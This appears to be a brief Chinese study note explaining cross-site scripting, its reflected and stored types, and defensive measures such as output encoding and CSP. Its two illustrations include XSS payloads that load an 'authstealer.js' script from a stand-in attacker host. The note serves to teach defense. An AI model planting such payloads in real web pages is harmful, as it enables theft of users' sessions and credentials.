

## XSS攻击原理及类型？

**原理**

在客户端向网页中写入可执行脚本，然后提交给服务器，服务器生成包含该脚本的网页。

**非持久性XSS**

写入可执行脚本的网页是临时的，脚本信息不会保存到数据库。

```
网站：search.com
A：发现 search.com?q=XXX页面显示“查询到XXX”
A: 修改 search.com?q=http://bobssite.org?q=dogs%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E
A: 链接发送给B
B: 访问链接，执行js
```

**持久性XSS**

脚本信息会保存到数据库。

```
网站：comment.com
A: 发表评论‘I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">’
A: 将包含评论的页面链接发给B
B: 访问链接，执行js
```

## 防范措施？
1. 上下文输出编码/转义字符串输入
2. 安全验证不受信任的HTML输入
3. Cookie增加IP验证
4. 禁用脚本
5. 使用CSP内容安全策略
